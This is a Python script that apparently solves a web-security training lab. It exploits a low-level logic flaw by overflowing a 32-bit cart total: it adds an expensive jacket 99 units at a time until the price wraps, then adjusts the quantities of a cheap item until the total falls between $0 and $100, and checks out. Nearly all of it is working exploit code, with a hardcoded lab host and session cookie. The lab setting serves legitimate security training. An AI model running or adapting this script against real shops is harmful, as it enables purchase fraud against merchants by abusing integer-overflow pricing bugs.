# Low-level logic flaw — overflow the cart total, then adjust it into [0, $100]
#
# How the lab works:
#   - The cart total is `price * quantity` stored in a 32-bit signed integer (cents),
#     so it wraps at 2^31 and can end up as a small (or negative) value.
#   - The checkout rejects negative totals ("Cart total price cannot be less than
#     zero") and totals above the store credit, so the total must land in [0, 100].
#   - The `quantity` parameter is capped at 99 for positive values, so the item has
#     to be added many times to reach the overflow.
#   - A negative quantity removes units, but it cannot take the quantity below zero.
#
# Strategy:
#   1) Add a buffer of a cheap item (so we can remove units later to fine-tune).
#   2) Add the jacket 99 at a time until the total wraps (goes negative) and then
#      climbs back to a small positive value.
#   3) Fine-tune: remove jacket units while the total is above $1337, then remove
#      cheap items until the total is <= $100.
#   4) Checkout.
#
# Replace HOST / SESSION / item ids with your own lab instance.

import re
import time
import urllib.parse
import urllib.request

HOST = "0a03008a042214ef8126b1cb00fb0021.web-security-academy.net"
SESSION = "ieaWfSv2LeOa7XcsYUQK3mQON9ftD5mT"

JACKET = "1"    # $1337.00  -> overflow
JACKET_PRICE = 1337.0
CHEAP = "16"    # $17.32    -> fine-tuning
CHEAP_PRICE = 17.32


def req(path, data=None):
    url = "https://%s%s" % (HOST, path)
    r = urllib.request.Request(url, data=data, headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "session=" + SESSION,
        "User-Agent": "Mozilla/5.0",
    })
    return urllib.request.urlopen(r, timeout=25).read().decode("utf-8", "replace")


def add(product_id, qty):
    req("/cart", urllib.parse.urlencode({
        "productId": product_id, "redir": "CART", "quantity": str(qty)}).encode())


def state():
    """Return (cart_total_in_dollars, [quantities]) read from the cart page."""
    html = req("/cart")
    m = re.search(r"Total:.*?(-?\$?\d[\d,]*\.\d{2})", html, re.S)
    total = float(m.group(1).replace("$", "").replace(",", "")) if m else 0.0
    qtys = [int(q) for q in re.findall(r"(\d{1,9})\s*<form action=/cart", html)]
    return total, qtys


def checkout():
    html = req("/cart")
    csrf = re.search(r'name="csrf" value="([^"]+)"', html)
    res = req("/cart/checkout", urllib.parse.urlencode(
        {"csrf": csrf.group(1) if csrf else ""}).encode())
    return "order-confirmed" in res or "Congratulations" in res


def main():
    # start from a clean cart
    add(JACKET, -99999999)
    add(CHEAP, -99999999)

    # buffer of the cheap item so we can remove units during fine-tuning
    add(CHEAP, 300)

    # 2) overflow the total with the jacket (99 at a time)
    wrapped = False
    while True:
        total, _ = state()
        if total < 0:
            wrapped = True
        if wrapped and total >= 0 and total < 200000:
            break              # wrapped and climbed back near zero
        add(JACKET, 99)

    # 3) fine-tune into [0, 100]
    while True:
        total, qtys = state()
        if 0 <= total <= 100:
            break
        if total > JACKET_PRICE:
            add(JACKET, -1)    # remove a jacket (big step)
        elif total > 100:
            add(CHEAP, -1)     # remove a cheap item (small step)
        else:                  # total < 0
            add(CHEAP, 1)      # add a cheap item
        time.sleep(0.05)
        print("  total now: $%.2f" % total)

    # 4) checkout
    print("final total: $%.2f -> checking out" % total)
    print("solved:", checkout())


if __name__ == "__main__":
    main()
